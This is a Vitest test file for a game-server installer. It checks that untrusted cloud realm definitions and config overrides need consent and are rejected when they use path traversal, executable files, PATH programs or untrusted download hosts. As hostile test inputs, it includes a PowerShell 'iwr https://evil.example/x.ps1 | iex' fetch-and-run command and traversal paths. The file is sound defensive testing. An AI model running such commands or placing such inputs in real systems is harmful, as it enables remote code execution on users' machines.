import { describe, it, expect, vi, beforeEach } from "vitest";
import fs from "fs";
import os from "os";
import path from "path";

// Shell creation + config overrides: legacy payloads keep the historic
// placeholder behavior; v2 payloads defer mods/configs to materialization.

const bag = {
  definitions: [] as any[],
  createdDefinitions: [] as any[],
  createdServers: [] as any[],
  createdMods: [] as any[],
  logs: [] as any[],
};

vi.mock("@/lib/db", () => ({
  prisma: {
    gameDefinition: {
      findMany: async ({ where }: any) =>
        bag.definitions.filter((d) =>
          where.OR.some(
            (c: any) =>
              (c.ownerId ?? null) === (d.ownerId ?? null) &&
              (typeof c.slug === "string" ? d.slug === c.slug : c.slug.in.includes(d.slug))
          )
        ),
      findUniqueOrThrow: async ({ where }: any) => bag.definitions.find((d) => d.id === where.id)!,
      create: async ({ data }: any) => {
        const row = { id: "def-new", ...data };
        bag.definitions.push(row);
        bag.createdDefinitions.push(row);
        return row;
      },
    },
    server: {
      create: async ({ data }: any) => {
        const s = { id: "srv-new", ...data };
        bag.createdServers.push(s);
        return s;
      },
      delete: vi.fn(async () => {}),
    },
    modInstallation: {
      create: async ({ data }: any) => {
        bag.createdMods.push(data);
        return data;
      },
    },
    activityLog: {
      create: async ({ data }: any) => {
        bag.logs.push(data);
        return data;
      },
    },
  },
}));

vi.mock("@/lib/appPaths", () => ({
  dataRoot: () => tmpRoot,
}));

import {
  createRealmServerShell,
  applyConfigOverrides,
  planRealmDefinition,
  RealmDefinitionConsentError,
  RealmDefinitionRejectedError,
} from "../installer";

let tmpRoot = "";

beforeEach(() => {
  tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "rs-installer-"));
  bag.definitions = [
    {
      id: "def-mc",
      slug: "MINECRAFT",
      displayName: "Minecraft",
      recommendedRamGB: 4,
      spec: JSON.stringify({ install: { url: "https://x/server.jar", fileName: "server.jar", checkFile: "server.jar" }, launch: { executable: "java", args: [] }, defaultPort: 25565, params: [] }),
    },
  ];
  bag.createdDefinitions = [];
  bag.createdServers = [];
  bag.createdMods = [];
  bag.logs = [];
});

const baseTemplate = (payload: any) => ({
  id: "realm-1",
  name: "Test Realm",
  gameSlug: "MINECRAFT",
  payload,
  customDefSpec: null,
});

describe("applyConfigOverrides", () => {
  it("writes allowed files and skips traversal + bad extensions", () => {
    const applied = applyConfigOverrides("srv-x", [
      { path: "config/game.ini", strategy: "template", content: "[a]\nb=1" },
      { path: "../escape.txt", strategy: "template", content: "evil" },
      { path: "/absolute/path.json", strategy: "template", content: "evil" },
      { path: "virus.exe", strategy: "template", content: "evil" },
    ]);
    expect(applied).toBe(1);
    expect(fs.readFileSync(path.join(tmpRoot, "local-servers", "srv-x", "config", "game.ini"), "utf-8")).toBe("[a]\nb=1");
    expect(fs.existsSync(path.join(tmpRoot, "escape.txt"))).toBe(false);
    expect(fs.existsSync(path.join(tmpRoot, "local-servers", "srv-x", "virus.exe"))).toBe(false);
  });
});

describe("createRealmServerShell", () => {
  it("legacy payloads: placeholder mod rows + configs applied immediately", async () => {
    const shell = await createRealmServerShell(
      baseTemplate({
        version: "1.0.0",
        mods: [{ provider: "thunderstore", packageId: "x-Pack", name: "X" }],
        configOverrides: [{ path: "server.properties", strategy: "template", content: "motd=hi" }],
        startupParams: {},
      }),
      "user-1"
    );
    expect(shell.v2).toBe(false);
    expect(bag.createdMods).toHaveLength(1);
    expect(bag.createdMods[0]).toMatchObject({ serverId: "srv-new", provider: "thunderstore", version: "latest" });
    expect(fs.readFileSync(path.join(tmpRoot, "local-servers", "srv-new", "server.properties"), "utf-8")).toBe("motd=hi");
  });

  it("v2 payloads: no placeholder rows, configs deferred to materialize", async () => {
    const shell = await createRealmServerShell(
      baseTemplate({
        version: "2.0",
        mods: [{ provider: "modrinth", packageId: "carpet", name: "Carpet", version: "1.0" }],
        configOverrides: [{ path: "server.properties", strategy: "template", content: "motd=hi" }],
        startupParams: {},
        loader: { type: "fabric", loaderVersion: "0.20.1", minecraftVersion: "1.21.1" },
      }),
      "user-1"
    );
    expect(shell.v2).toBe(true);
    expect(bag.createdMods).toHaveLength(0);
    expect(fs.existsSync(path.join(tmpRoot, "local-servers", "srv-new", "server.properties"))).toBe(false);
  });
});

// A realm for a game RealmSwap doesn't ship carries its own game definition —
// the program the deployer's machine will run. The realm row is cloud data
// any account can write, so this path is the trust boundary.
describe("createRealmServerShell: realms that bring their own game definition", () => {
  const legacyPayload = { version: "1.0.0", mods: [], configOverrides: [], startupParams: {} };
  const goodDef = () => ({
    name: "Cool Game",
    recommendedRamGB: 6,
    install: { appId: 896660, installSubDir: "cool", checkFile: "cool_server.exe", requiredDiskGB: 2 },
    launch: { executable: "cool_server.exe", args: ["-port", "{port}"] },
    defaultPort: 2456,
    params: [],
    configFiles: [],
    ports: [{ protocol: "UDP", port: "{port}" }],
    notPartOfTheSpec: "dropped",
  });
  const realm = (customDefSpec: unknown, gameSlug = "COOLGAME") => ({
    id: "realm-2",
    name: "Cool Realm",
    gameSlug,
    payload: legacyPayload as any,
    customDefSpec: customDefSpec as any,
  });

  it("stops for consent before writing anything, and says what would run", async () => {
    const attempt = createRealmServerShell(realm(goodDef()), "user-1");
    await expect(attempt).rejects.toBeInstanceOf(RealmDefinitionConsentError);
    await attempt.catch((err: RealmDefinitionConsentError) => {
      expect(err.summary).toMatchObject({ source: "Steam app 896660", executable: "cool_server.exe" });
    });
    expect(bag.createdDefinitions).toHaveLength(0);
    expect(bag.createdServers).toHaveLength(0);
  });

  it("with consent: stores the gate's normalized spec, never the raw cloud JSON", async () => {
    const shell = await createRealmServerShell(realm(goodDef()), "user-1", { allowNewDefinition: true });
    expect(bag.createdDefinitions).toHaveLength(1);
    const def = bag.createdDefinitions[0];
    expect(def).toMatchObject({ slug: "COOLGAME", displayName: "Cool Game", installMethod: "STEAMCMD", ownerId: "user-1", recommendedRamGB: 6, requiredDiskGB: 2 });
    const stored = JSON.parse(def.spec);
    expect(stored.install.appId).toBe("896660");
    expect(stored).not.toHaveProperty("notPartOfTheSpec");
    expect(stored).not.toHaveProperty("name");
    expect(bag.createdServers[0]).toMatchObject({ definitionId: "def-new", game: "COOLGAME", port: 2456 });
    expect(shell.defName).toBe("Cool Game");
  });

  it("refuses a definition that runs a PATH program, even with consent", async () => {
    const exploit = {
      ...goodDef(),
      launch: { executable: "powershell.exe", executableOnPath: true, args: ["-NoProfile", "-Command", "iwr https://evil.example/x.ps1 | iex"] },
    };
    await expect(createRealmServerShell(realm(exploit), "user-1", { allowNewDefinition: true })).rejects.toBeInstanceOf(RealmDefinitionRejectedError);
    expect(bag.createdDefinitions).toHaveLength(0);
    expect(bag.createdServers).toHaveLength(0);
  });

  it("refuses a definition with no install block instead of treating it as script-based", async () => {
    const { install: _install, ...noInstall } = goodDef();
    const scripted = { ...noInstall, launch: { executable: "x", args: [], launchScript: "calc.exe" } };
    await expect(createRealmServerShell(realm(scripted), "user-1", { allowNewDefinition: true })).rejects.toBeInstanceOf(RealmDefinitionRejectedError);
    expect(bag.createdDefinitions).toHaveLength(0);
  });

  it("refuses a download from an untrusted host", async () => {
    const def = { ...goodDef(), install: { url: "https://evil.example/server.zip", fileName: "server.zip", checkFile: "cool_server.exe" } };
    await expect(createRealmServerShell(realm(def), "user-1", { allowNewDefinition: true })).rejects.toThrow(/trusted download list/);
  });

  it("a built-in always wins over the realm's own definition, whatever the slug's case", async () => {
    const plan = await planRealmDefinition(realm(goodDef(), "minecraft"), "user-1");
    expect(plan).toEqual({ kind: "existing", definitionId: "def-mc" });
    const shell = await createRealmServerShell(realm(goodDef(), "minecraft"), "user-1");
    expect(shell.gameSlug).toBe("MINECRAFT");
    expect(bag.createdDefinitions).toHaveLength(0);
  });

  it("reuses the deployer's own definition without asking again", async () => {
    bag.definitions.push({ id: "def-mine", slug: "COOLGAME", displayName: "Mine", ownerId: "user-1", spec: JSON.stringify(goodDef()) });
    await createRealmServerShell(realm(goodDef()), "user-1");
    expect(bag.createdServers[0]).toMatchObject({ definitionId: "def-mine" });
    expect(bag.createdDefinitions).toHaveLength(0);
  });

  it("never binds to another user's private definition", async () => {
    bag.definitions.push({ id: "def-theirs", slug: "COOLGAME", displayName: "Theirs", ownerId: "someone-else", spec: "{}" });
    await expect(createRealmServerShell(realm(null), "user-1")).rejects.toThrow(/game definition not found/);
    await createRealmServerShell(realm(goodDef()), "user-1", { allowNewDefinition: true });
    expect(bag.createdServers[0]).toMatchObject({ definitionId: "def-new" });
  });

  it("refuses a game id that is not a plain identifier", async () => {
    await expect(planRealmDefinition(realm(goodDef(), "../../escape"), "user-1")).rejects.toBeInstanceOf(RealmDefinitionRejectedError);
  });
});
